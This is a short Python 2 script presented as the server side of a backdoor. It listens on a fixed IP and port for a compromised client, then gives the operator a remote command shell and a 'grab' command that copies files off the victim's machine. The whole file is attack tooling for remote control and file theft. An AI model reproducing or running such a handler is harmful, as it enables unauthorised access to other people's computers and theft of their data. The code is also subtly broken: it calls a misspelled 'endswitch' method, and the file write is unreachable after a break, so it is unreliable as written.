#ServerBackDoor
#A Simple Backdoor that: Can Grab some files, and can navigate using cd
#Use this with the TCP-Client.py 

import socket 
import subprocess
import os

def transfer(conn, command):

	conn.send(command)
	f = open('/root/Desktop/Saves/test.png', 'wb')
	while True:
		bits = conn.recv(1024)
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		if bits.endswitch('DONE'):
			print '[+] Transferencia Completa'
			f.close()
			break
			f.write(bits)


def connection():
	myIP = '172.16.52.129'
	porta = 4445
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((myIP, porta))
	s.listen(1)
	print '[+] Listening for incoming TCP Connection on port', porta
	
	conn,addr = s.accept()
	print '[+] We got a connection from: ', addr
	
	while True:

		command = raw_input("Shell>")
		
		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break
		
		#Example: grab*C:\Users\ola.txt
		elif 'grab' in command:
			transfer(conn,command)

		elif 'cd' in command: 
			conn.send(command)
	
		else:
			conn.send(command)
			print conn.recv(1024)

def main ():
	connection()
main()
